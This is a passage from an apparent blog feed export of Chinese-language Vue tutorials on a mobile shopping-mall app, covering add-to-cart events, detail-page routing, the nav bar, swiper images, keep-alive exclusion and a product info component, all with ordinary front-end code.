#f69;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h2 id="回到顶部工具"><a href="#回到顶部工具" class="headerlink" title="回到顶部工具"></a>回到顶部工具</h2><p>同Home一样，将相关代码以及组件引入即可</p><h2 id="加入购物车"><a href="#加入购物车" class="headerlink" title="加入购物车"></a>加入购物车</h2><p>这里实现点击加入购物车按钮，将该商品添加至购物车，实现过程较为简单，首先在将子组件DeatilBottomNav的点击事件发送到父组件中去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;cart&quot; @click&#x3D;&quot;addToCart&quot;&gt;加入购物车&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addToCart() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$emit(<span class="string">'addToCart'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Detail.vue监听该组件点击事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;detail-bottom-bar @addToCart&#x3D;&quot;addToCart&quot;&gt;&lt;&#x2F;detail-bottom-bar&gt;</span><br></pre></td></tr></table></figure><p>实现点击方法同时新建一个数组用于存储需要传递给购物车的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加购物车</span></span><br><span class="line">addToCart() &#123;</span><br><span class="line">  <span class="keyword">const</span> product = &#123;&#125;</span><br><span class="line">  product.image = <span class="keyword">this</span>.topImages[<span class="number">0</span>]</span><br><span class="line">  product.title = <span class="keyword">this</span>.goods.title</span><br><span class="line">  product.desc = <span class="keyword">this</span>.goods.desc</span><br><span class="line">  product.price = <span class="keyword">this</span>.goods.realPrice</span><br><span class="line">  product.iid = <span class="keyword">this</span>.iid</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.详情页上</title>
      <link href="/2021/03/02/5.%E8%AF%A6%E6%83%85%E9%A1%B5%E4%B8%8A/"/>
      <url>/2021/03/02/5.%E8%AF%A6%E6%83%85%E9%A1%B5%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="相关预处理及详情页路由思路"><a href="#相关预处理及详情页路由思路" class="headerlink" title="相关预处理及详情页路由思路"></a>相关预处理及详情页路由思路</h2><ol><li><p>在项目views文件夹下新建一个Detail文件夹，并新建一个childComps子文件夹用来存放子组件，在Detail文件夹中新建Detail.vue文件</p></li><li><p>路由配置</p><p>添加detail相关路由，这里和之前添加的路由路径不太一样，因为我们要看每个商品的详情页面，所以我们需要传递具体商品的id号（该项目为iid）以便导航到该商品的详情页面，所以我们为其配置动态路由，如下代码所示</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: <span class="string">'/detail/:iid'</span>,</span><br><span class="line">  component: Detail</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>商品点击事件以及Detail.vue页面配置</p><p>为每个商品注册点击事件，以便跳转到该商品的详情界面，来到GoodsListItem文件，为最外围的div注册点击事件（因为点击该商品无论哪个位置都可以导航到商品详情页）<code>&lt;div class=&quot;goods-list-item&quot; @click=&quot;itemClick&quot;&gt;</code></p><p>接着，实现点击跳转路由，这里，我们通过父组件传来的goodsItem属性拿到每个商品的iid，然后进行路由跳转</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">itemClick() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$router.push(<span class="string">'/detail/'</span>+<span class="keyword">this</span>.goodsItem.iid)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是，Detaili组件了，初始化完组件后，我们为其定义一个iid数据用来存储当前的商品iid，在组件创建时即保存该id</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   data() &#123;</span><br><span class="line">     <span class="keyword">return</span> &#123;</span><br><span class="line">       iid: <span class="literal">null</span></span><br><span class="line">   &#125;,</span><br><span class="line">created() &#123;</span><br><span class="line">     <span class="comment">//保存传入的id</span></span><br><span class="line">     <span class="keyword">this</span>.iid = <span class="keyword">this</span>.$route.params.iid</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure></li></ol><h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><p>从上到下解决页面布局，首先就是导航栏的设置，在childComps文件夹新建一个DetailNavBar文件</p><ol><li><p>首先导入我们的NavBar组件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> NavBar <span class="keyword">from</span> <span class="string">'components/common/navbar/NavBar'</span></span><br></pre></td></tr></table></figure></li><li><p>然后就是使用以及插槽定义，这里要展示的中间插槽需要多个数据，我们通过遍历定义的titles数据来渲染该插槽，并设置相关样式，这里使用flex布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;nav-bar&gt;</span><br><span class="line">  &lt;div slot&#x3D;&quot;center&quot; class&#x3D;&quot;title&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;title-item&quot; </span><br><span class="line">    v-for&#x3D;&quot;(item,index) in titles&quot;&gt;</span><br><span class="line">      &#123;&#123;item&#125;&#125;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;nav-bar&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    titles: [<span class="string">'商品'</span>, <span class="string">'参数'</span>, <span class="string">'评论'</span>, <span class="string">'推荐'</span>],</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .title &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">  &#125;</span><br><span class="line">  .title-item &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>文字切换颜色样式改变</strong></p><p>这里同之前的思路一样，遍历数据的同时将定义的currentIndex设置为当前点击的索引号，进行动态样式匹配，思路如下</p><ol><li><p>data创建currentIndex数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    titles: [<span class="string">'商品'</span>, <span class="string">'参数'</span>, <span class="string">'评论'</span>, <span class="string">'推荐'</span>],</span><br><span class="line">    currentIndex: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>为for遍历的每个div注册点击事件，每次点击，currentIndex设置为当前点击索引值</p></li><li><p>动态绑定class，判断当前index是否和currentIndex一致，一致，则展示active样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div slot&#x3D;&quot;center&quot; class&#x3D;&quot;title&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;title-item&quot; </span><br><span class="line">  v-for&#x3D;&quot;(item,index) in titles&quot;</span><br><span class="line">  @click&#x3D;&quot;itemClick(index)&quot;</span><br><span class="line">  :class&#x3D;&quot;&#123;active: index &#x3D;&#x3D;&#x3D; currentIndex&#125;&quot;&gt;</span><br><span class="line">    &#123;&#123;item&#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  itemClick(index) &#123;</span><br><span class="line">    <span class="keyword">this</span>.currentIndex = index</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--color-high-text)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>返回按钮</p><p>这里很简单啦，就是在left插槽定义一个img，然后设置相关样式，同时绑定点击事件，每次点击跳转到上一个路由<code>$router.back()</code>具体代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div slot&#x3D;&quot;left&quot; class&#x3D;&quot;back&quot; @click&#x3D;&quot;backClick&quot;&gt;</span><br><span class="line">  &lt;img src&#x3D;&quot;~assets&#x2F;img&#x2F;common&#x2F;back.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backClick() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$router.back()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.back</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="商品数据请求以及轮播图展示"><a href="#商品数据请求以及轮播图展示" class="headerlink" title="商品数据请求以及轮播图展示"></a>商品数据请求以及轮播图展示</h2><p>前面咱们保存过商品id，这个时候就要用到各个商品的id去请求对应的商品数据</p><p>首先，让我们去到network文件夹下，新建一个detail.js文件用于发送相关网络请求</p><p>导入之前封装好的request函数，导出相对应的getDeatil函数用于网络数据请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; request &#125; <span class="keyword">from</span> <span class="string">'./request.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">getDetail</span>(<span class="params">iid</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    url: <span class="string">'/api/h8/detail'</span>,</span><br><span class="line">    params: &#123;</span><br><span class="line">      iid</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到Deatil.vue这里，导入该模块的商品数据请求函数后，进行网络请求并保存相应数据，我们首先定义一个topImages用于保存轮播图图片数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    iid: <span class="literal">null</span>,</span><br><span class="line">    topImages: [],</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在组件创建（created）时，发送网络请求并保存该数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">created() &#123;</span><br><span class="line">     <span class="comment">//保存传入的id</span></span><br><span class="line">     <span class="keyword">this</span>.iid = <span class="keyword">this</span>.$route.params.iid</span><br><span class="line">     <span class="comment">//获取商品数据</span></span><br><span class="line">     getDetail(<span class="keyword">this</span>.iid).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="keyword">const</span> data = res.result</span><br><span class="line">       <span class="comment">//获取顶部图片数据</span></span><br><span class="line">       <span class="keyword">this</span>.topImages = data.itemInfo.topImages</span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>然后就是轮播图展示了，我们先创建一个DetailSwiper组件，位置应该不用说了（childComps），导入Swiper以及SwiperItem组件，然后就是定义一个props用于接收父组件传下来的轮播图数据，接着就是在轮播图组件中遍历该图片数据并进行展示，<a href>代码如下</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;swiper class&#x3D;&quot;detail-swiper&quot;&gt;</span><br><span class="line">    &lt;swiper-item v-for&#x3D;&quot;item in topImages&quot;&gt;</span><br><span class="line">      &lt;img :src&#x3D;&quot;item&quot;&gt;</span><br><span class="line">    &lt;&#x2F;swiper-item&gt;</span><br><span class="line">  &lt;&#x2F;swiper&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import &#123;Swiper, SwiperItem&#125; from &#39;components&#x2F;common&#x2F;swiper&#39;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#39;DetailSwipe&#39;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      Swiper,</span><br><span class="line">      SwiperItem</span><br><span class="line">    &#125;,</span><br><span class="line">    props:&#123;</span><br><span class="line">        topImages: &#123;</span><br><span class="line">          type: Array,</span><br><span class="line">          default() &#123;</span><br><span class="line">            return []</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .detail-swiper &#123;</span><br><span class="line">    height: 300px;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>然后，就可以欣赏你的轮播图了🤭，但是，等等，球德玛蝶，为什么无论我点击哪个商品，最后出来的总是第一次点击的商品数据轮播图，这不合理啊，确实不合理，但仔细想想就会发现，其实你在之前做过了组件保留状态对不，那么在keep-alive包裹下的组件都会保留之前的状态，那么，怎么避免详情页保留状态呢，你可以到App.vue中将不需要保留的组件按下格式定义属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive exclude&#x3D;&quot;Detail&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="商品基本信息"><a href="#商品基本信息" class="headerlink" title="商品基本信息"></a>商品基本信息</h2><p>来到了对商品基本信息进行展示的环节了，在这里，我们首先要对接口的数据进行分析，分析完后在进行相关的展示</p><p>因为接口里面的数据比较混乱，分布在各个对象或者数组中，不要疑惑，因为在真实工作中你就可能会遇到该问题，然后就是解决办法，第一个就是你可以在每次渲染数据时找到各个数据的具体位置，然后渲染，但是难免使得代码看起来有点难阅读，所以这里采用第二个办法——对其进行整合封装</p><p>来到detaili.js文件，我们首先定义一个类Goods，接着使用构造函数，使得每次你请求数据时，直接new一个对象并传入指定的数据位置，然后再得到各个更佳细化的数据属性，代码如下（根据查阅接口一次性封装）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Goods</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(itemInfo, columns, services) &#123;</span><br><span class="line">    <span class="keyword">this</span>.title = itemInfo.title</span><br><span class="line">    <span class="keyword">this</span>.desc = itemInfo.desc</span><br><span class="line">    <span class="keyword">this</span>.newPrice = itemInfo.price</span><br><span class="line">    <span class="keyword">this</span>.oldPrice = itemInfo.oldPrice</span><br><span class="line">    <span class="keyword">this</span>.discount = itemInfo.discountDesc</span><br><span class="line">    <span class="keyword">this</span>.columns = columns</span><br><span class="line">    <span class="keyword">this</span>.services = services</span><br><span class="line">    <span class="keyword">this</span>.realPrice = itemInfo.lowNowPrice</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是在Detail组件中去保存该数据了，记得先引入该类，在获取商品数据后初始化该对象并保存在自定义的goods值中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取商品数据</span></span><br><span class="line">   getDetail(<span class="keyword">this</span>.iid).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">const</span> data = res.result</span><br><span class="line">     <span class="comment">//获取顶部图片数据</span></span><br><span class="line">     <span class="keyword">this</span>.topImages = data.itemInfo.topImages</span><br><span class="line"></span><br><span class="line">     <span class="comment">//获取商品基本信息数据</span></span><br><span class="line">     <span class="keyword">this</span>.goods = <span class="keyword">new</span> Goods(data.itemInfo, data.columns, data.shopInfo.services)</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><p>然后就是创建DetailBaseInfo组件，相关代码如下，其中大多是之前的知识点，这里不再赘述，主要就是有两个需要注意的知识点</p><ol><li><p><code>v-for</code>可以对数字进行遍历，然后再去取到相应的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- v-for也可以遍历数字，通过遍历数字获得需要的商品数据 --&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;info-service-item&quot; v-for&#x3D;&quot;index in goods.services.length-1&quot; :key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">  &lt;img :src&#x3D;&quot;goods.services[index-1].icon&quot;&gt;</span><br><span class="line">  &lt;span&gt;&#123;&#123;goods.services[index-1].name&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用v-if进行数据判断，数据存在与否再决定该组件是否渲染</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> &lt;div v-if&#x3D;&quot;Object.keys(goods).length !&#x3D;&#x3D; 0&quot; class&#x3D;&quot;base-info&quot;&gt;</span><br><span class="line">...</span><br><span class="line"> &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure></li></ol><p>完整代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div v-if&#x3D;&quot;Object.keys(goods).length !&#x3D;&#x3D; 0&quot; class&#x3D;&quot;base-info&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;info-title&quot;&gt;&#123;&#123;goods.title&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;info-price&quot;&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;n-price&quot;&gt;&#123;&#123;goods.newPrice&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;o-price&quot;&gt;&#123;&#123;goods.oldPrice&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span v-if&#x3D;&quot;goods.discount&quot; class&#x3D;&quot;discount&quot;&gt;&#123;&#123;goods.discount&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;info-other&quot;&gt;</span><br><span class="line">      &lt;span&gt;&#123;&#123;goods.columns[0]&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span&gt;&#123;&#123;goods.columns[1]&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;span&gt;&#123;&#123;goods.services[goods.services.length-1].name&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;info-service&quot;&gt;</span><br><span class="line">      &lt;!-- v-for也可以遍历数字，通过遍历数字获得需要的商品数据 --&gt;</span><br><span class="line">      &lt;span class&#x3D;&quot;info-service-item&quot; v-for&#x3D;&quot;index in goods.services.length-1&quot; :key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">        &lt;img :src&#x3D;&quot;goods.services[index-1].icon&quot;&gt;</span><br><span class="line">        &lt;span&gt;&#123;&#123;goods.services[index-1].name&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;DetailBaseInfo&quot;,</span><br><span class="line">    props: &#123;</span><br><span class="line">  goods: &#123;</span><br><span class="line">    type: Object,</span><br><span class="line">        default() &#123;</span><br><span class="line">      return &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .base-info &#123;</span><br><span class="line">    margin-top: 15px;</span><br><span class="line">    padding: 0 8px;</span><br><span class="line">    color: #999;</span><br><span class="line">    border-bottom: 5px solid #f2f5f8;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-title &#123;</span><br><span class="line">    color: #222</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-price &#123;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-price .n-price &#123;</span><br><span class="line">    font-size: 24px;</span><br><span class="line">    color: var(--color-high-text);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-price .o-price &#123;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">    margin-left: 5px;</span><br><span class="line">    text-decoration: line-through;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-price .discount &#123;</span><br><span class="line">    font-size: 12px;</span><br><span class="line">    padding: 2px 5px;</span><br><span class="line">    color: #fff;</span><br><span class="line">    background-color: var(--color-high-text);</span><br><span class="line">    border-radius: 8px;</span><br><span class="line">    margin-left: 5px;</span><br><span class="line"></span><br><span class="line">    &#x2F;*让元素上浮一些: 使用相对定位即可*&#x2F;</span><br><span class="line">    position: relative;</span><br><span class="line">    top: -8px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-other &#123;</span><br><span class="line">    margin-top: 15px;</span><br><span class="line">    line-height: 30px;</span><br><span class="line">    display: flex;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">    border-bottom: 1px solid rgba(100,100,100,.1);</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-service &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    line-height: 60px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-service-item img &#123;</span><br><span class="line">    width: 14px;</span><br><span class="line">    height: 14px;</span><br><span class="line">    position: relative;</span><br><span class="line">    top: 2px;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .info-service-item span &#123;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">    color: #333;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h2 id="商家（店铺）信息展示"><a href="#商家（店铺）信息展示" class="headerlink" 